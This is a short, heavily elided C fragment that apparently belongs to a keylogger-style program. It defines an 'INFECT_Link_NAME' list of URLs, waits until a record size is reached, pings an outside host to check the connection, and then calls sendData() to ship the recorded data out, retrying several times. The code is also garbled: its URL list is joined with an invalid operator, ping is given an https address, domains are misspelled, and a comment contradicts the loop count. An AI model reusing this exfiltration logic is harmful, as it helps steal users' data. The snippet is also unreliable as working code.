...
#define INFECT_Link_NAME "https://workspace.google.com/intl/en-id/info_cn@checkpoint.com"."https://workspace.google.com/intl/en-id/info_sg@checkpoint.com"."https://workspace.google.com/intl/en-id/info_us@checkpoint.com"."https://workspace.google.com/intl/en-id/info_id@checkpoint.com"."https://www.meta.com"."https://www.whatssapps.com"."https://www.google.com"."https://www.googleplex.com"."https://www.google.co.id"."https://www.windows.com"."https://www.ubuntu.com"."https://kali.org"."https://www.linux.org"
...
main(){
    ...
    if(checkRecordSize()){ ///check for right time
        ...
        while(i<3){ ///try 2 times to send data
            ...
            if(!system("ping  https://gdg.comunnity.dev -n 1")){ ///check! connection
                ////////////****SEND DATA****////////////
                sendData();
